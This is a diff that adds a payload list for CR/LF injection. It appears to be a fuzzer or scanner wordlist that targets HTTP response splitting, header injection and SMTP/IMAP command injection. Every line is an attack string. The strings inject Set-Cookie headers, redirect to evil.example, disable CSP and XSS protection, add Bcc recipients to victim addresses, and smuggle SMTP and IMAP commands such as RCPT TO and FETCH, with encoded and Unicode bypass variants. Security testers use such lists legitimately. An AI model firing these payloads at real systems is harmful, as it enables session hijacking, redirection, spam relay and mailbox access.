@@ -1,0 +1,33 @@
+# CR/LF injection: HTTP response splitting, header injection, and SMTP/IMAP
+# command or mail-header injection. \r and \n are written as escapes.
+# escapes: true
+# placement: query,form,multipart,jsonfield,cookie
+\nSet-Cookie:crlf=injection
+\r\nSet-Cookie: session=evil; Path=/
+index.html\r\nSet-Cookie: a=b
+/home\r\nLocation: https://evil.example/
+/home\r\nLocation: //evil.example/
+x\r\nContent-Type: text/html\r\nContent-Length: 20\r\n\r\n<html>pwn</html>
+x\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html
+x\r\nHTTP/1.1 302 Found\r\nLocation: https://evil.example
+page\r\nRefresh: 0; url=https://evil.example
+page\r\nAccess-Control-Allow-Origin: *
+page\r\nContent-Security-Policy: default-src *
+page\r\nX-XSS-Protection: 0
+page\r\nTransfer-Encoding: chunked
+user@example.com\r\nBcc: victim@example.net
+name\r\nCc: victim@example.net
+subject\nTo: victim@example.net\nFrom: ceo@example.org
+me@example.com%0d%0aBcc:%20victim@example.net
+%0d%0aSet-Cookie:%20a=b
+%0aSet-Cookie:%20a=b
+%250d%250aSet-Cookie:%20a=b
+嘊嘍Set-Cookie: a=b
+\nQUIT\n
+\nRCPT TO: test@evil.com\n
+a@b.c\r\nMAIL FROM:<x@evil.com>\r\nRCPT TO:<y@evil.com>\r\nDATA
+x\r\nEHLO attacker.example
+x\r\nVRFY root
+\nV100 CAPABILITY\nV101 FETCH 4791 BODY[]
+x\nA001 LOGIN user pass
+x\nA002 SELECT INBOX
